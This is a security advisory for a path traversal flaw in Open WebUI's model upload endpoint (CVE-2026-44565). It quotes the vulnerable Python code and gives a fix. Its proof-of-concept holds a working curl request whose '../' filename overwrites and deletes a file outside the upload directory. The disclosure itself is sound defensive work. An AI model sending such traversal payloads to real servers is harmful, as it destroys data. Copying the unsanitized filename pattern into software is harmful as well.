# [H] Open WebUI Arbitrary File Write, Delete via Path Traversal

## Summary
Severity: High
Advisory: GHSA-j3fw-wc48-29g3
CVE: CVE-2026-44565
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-j3fw-wc48-29g3
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.6.10

## Details
** CONFIDENTIAL **

Vulnerability Disclosure Analysis Documentation
-----------------------------------------------

Vulnerability Details
---------------------
1. Discoverer: Taylor Pennington of KoreLogic, Inc.
2. Date Submitted: June 11, 2024
3. Title: Open WebUI Arbitrary File Write, Delete via Path Traversal
4. High-level Summary:
     Attacker controlled files can be uploaded to arbitrary locations on the web
     server's filesystem by abusing a path traversal vulnerability. After the
     file is written, it is deleted.
5. Affected Vendor: Open WebUI
6. Affected Product(s): Open WebUI (Formerly Ollama WebUI)
7. Affected Version(s): 0.1.105
8. Platform/OS: Debian GNU/Linux 12 (bookworm)
9. Vector: HTTP web interface
10. CWE: 22 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
11. Technical Analysis:
   
   When attaching files to a prompt by clicking the plus sign (+) on the left of
   the message input box when using the Open WebUI HTTP interface, the file is
   uploaded to a static upload directory. If the file is an audio file
   it will be sent to a second API that will attempt to transcribe it.

   The name of the file is derived from the original HTTP upload request and is
   not validated or sanitized. This allows for users to upload files with names
   containing dot-segments in the file path and traverse out of the intended
   uploads directory. Effectively, users can upload files anywhere on the
   filesystem the user running the web server has permission.

   This can be visualized by examining the python code for the
   "/ollama/models/upload" API route (https://github.com/open-webui/open-webui/blob/0399a69b73de9789c4221acedea70d528e1346c4/backend/apps/ollama/main.py#L1063-L1127):

   ```
   def upload_model(file: UploadFile = File(...), url_idx: Optional[int] = None):
    if url_idx == None:
        url_idx = 0
    ollama_url = app.state.OLLAMA_BASE_URLS[url_idx]

    file_path = f"{UPLOAD_DIR}/{file.filename}"

    # Save file in chunks
    with open(file_path, "wb+") as f:
        for chunk in file.file:
            f.write(chunk)

    def file_process_stream():
        nonlocal ollama_url
        total_size = os.path.getsize(file_path)
        chunk_size = 1024 * 1024
        try:
            with open(file_path, "rb") as f:
                total = 0
                done = False

                while not done:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        done = True
                        continue

                    total += len(chunk)
                    progress = round((total / total_size) * 100, 2)

                    res = {
                        "progress": progress,
                        "total": total_size,
                        "completed": total,
                    }
                    yield f"data: {json.dumps(res)}\n\n"

                if done:
                    f.seek(0)
                    hashed = calculate_sha256(f)
                    f.seek(0)

                    url = f"{ollama_url}/api/blobs/sha256:{hashed}"
                    response = requests.post(url, data=f)

                    if response.ok:
                        res = {
                            "done": done,
                            "blob": f"sha256:{hashed}",
                            "name": file.filename,
                        }
                        os.remove(file_path)
                        yield f"data: {json.dumps(res)}\n\n"
                    else:
                        raise Exception(
                            "Ollama: Could not create blob, Please try again."
                        )

        except Exception as e:
            res = {"error": str(e)}
            yield f"data: {json.dumps(res)}\n\n"

    return StreamingResponse(file_process_stream(), media_type="text/event-stream")
    ```

    The model is temporarily written to disk in chunks and then the data is sent to
    another internal API. Once the file is successfully passed, the file is removed
    from the disk. Note line 1116, `os.remove(file_path)`.

    This has an affect of stomping on and ultimately deleting any file that the user
    of the open-webui service has permissions over.

    It may be possible to continue sending chunks to the file slowly and create
    a race condition however, this was not validated.

12. Proof-of-Concept:

    First, create a file under the `/tmp` directory named `DELETE_ME` while
    logged in as the user account of the web application or chown the file to be
    owned by the open-webui user.

    ```
    # su ollama
    # touch /tmp/DELETE_ME
    ```
   
   Execute the following cURL command after replacing the exported `JWT` value for a valid user session:

    ```
    export JWT="JWT_HERE"; curl -s -X $'POST' \
    -H $'Host: openwebui.example.com' -H $'Content-Length: 206' -H "Authorization: Bearer ${JWT}" -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW' \
    --data-binary $'------WebKitFormBoundary7MA4YWxkTrZu0gW\x0d\x0aContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../tmp/DELETE_ME\"\x0d\x0aContent-Type: image/png\x0d\x0a\x0d\x0a\x0d\x0a------WebKitFormBoundary7MA4YWxkTrZu0gW--' \
    $'https://openwebui.example.com/ollama/models/upload'
    ```

    Verify that `/tmp/DELETE_ME` has been deleted.

13. Mitigation Recommendation: Modify line 1070 (https://github.com/open-webui/open-webui/blob/0399a69b73de9789c4221acedea70d528e1346c4/backend/apps/ollama/main.py#L1070) to: 

```
filename = os.path.basename(file.filename)
file_path = f"{UPLOAD_DIR}/{filename}"
```

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-j3fw-wc48-29g3
- https://nvd.nist.gov/vuln/detail/CVE-2026-44565
- https://github.com/open-webui/open-webui
